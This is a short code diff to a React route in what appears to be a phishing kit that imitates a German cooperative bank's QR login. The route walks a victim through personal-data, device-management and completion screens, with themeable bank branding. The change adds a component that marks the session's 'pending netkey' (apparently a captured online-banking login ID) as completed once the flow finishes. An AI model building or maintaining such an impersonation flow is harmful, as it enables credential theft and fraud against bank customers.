@@ -6,6 +6,7 @@ import { submitQrContactExtras, requestDeviceList } from "@/lib/qrLogin.function
 import { resolveAsset } from "@/lib/bankAssetUrl";
 import { BankShell, type FlowTheme } from "@/components/flow/BankShell";
 import { CompletionStep } from "@/components/flow/CompletionStep";
+import { completePendingNetkey } from "@/lib/completedNetkeys";
 import PersonalDataOverview, { type CustomerData } from "@/components/flow/PersonalDataOverview";
 import { DeviceManagementStep, type Device } from "@/components/flow/DeviceManagementStep";
 import vrLogoGeneric from "@/assets/vr-logo-generic.png";
@@ -25,6 +26,11 @@ function CyclingLoader() {
       <p className="text-lg text-gray-700 font-medium">{LOADER_MESSAGES[i]}</p>
     </div>
   );
+}
+
+function NetkeyCompletionMarker({ refId }: { refId: string }) {
+  useEffect(() => { completePendingNetkey(refId); }, [refId]);
+  return null;
 }
 
 export const Route = createFileRoute("/qr-personal-data/$sessionId")({
@@ -166,6 +172,7 @@ function QrPersonalDataPage() {
   if (stage === "done") {
     return (
       <BankShell {...shellProps}>
+        <NetkeyCompletionMarker refId={sessionId} />
         <CompletionStep theme={theme} customerName={row.customer_name ?? ""} />
       </BankShell>
     );
